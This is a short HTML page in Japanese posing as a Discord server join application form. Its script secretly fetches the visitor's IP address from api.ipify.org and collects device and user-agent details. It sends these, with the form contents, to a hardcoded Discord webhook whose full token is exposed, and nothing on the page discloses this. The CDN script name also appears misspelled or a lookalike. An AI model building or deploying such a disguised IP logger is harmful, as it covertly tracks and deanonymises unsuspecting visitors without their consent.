<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8">
  <title>Discord参加申請</title>
  <!-- UAParser.js のCDNを追加 -->
  <script src="https://cdn.jsdelivr.net/npm/uap-parser-js@0.7.28/dist/ua-parser.min.js"></script>
</head>
<body>
  <h1>Discordサーバー参加申請フォーム</h1>
  <form id="applyForm">
    <input type="text" name="username" placeholder="あなたのDiscord名" required><br>
    <textarea name="reason" placeholder="参加理由" required></textarea><br>
    <button type="submit">送信</button>
  </form>

  <script>
    document.getElementById('applyForm').addEventListener('submit', async function (e) {
      e.preventDefault();

      const formData = new FormData(e.target);
      const username = formData.get('username');
      const reason = formData.get('reason');

      // デバイス情報取得
      const deviceInfo = navigator.userAgent;

      // UAParserを使って機種名を取得
      const parser = new UAParser();
      const result = parser.getResult();
      const deviceName = result.device.model || "不明なデバイス";

      // IPアドレス取得
      const ipData = await fetch('https://api.ipify.org?format=json').then(res => res.json());

      // Webhookへ送信
      fetch('https://discord.com/api/webhooks/1362686432870924372/S8va6w9Ro_W0BD9B9rTYrBCGgsXH20A6WTZCiSA-SmQ928zpdvxb8qkNuZvGxCVorrbr', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          content: '**新しい申請があります**',
          embeds: [{
            title: '申請情報',
            fields: [
              { name: 'ユーザー名', value: username },
              { name: '参加理由', value: reason },
              { name: 'IPアドレス', value: ipData.ip },
              { name: 'デバイス情報', value: `${deviceName} (${deviceInfo})` }
            ],
            color: 0x3498db
          }]
        })
      });

      alert("申請を送信しました！");
    });
  </script>
</body>
</html>
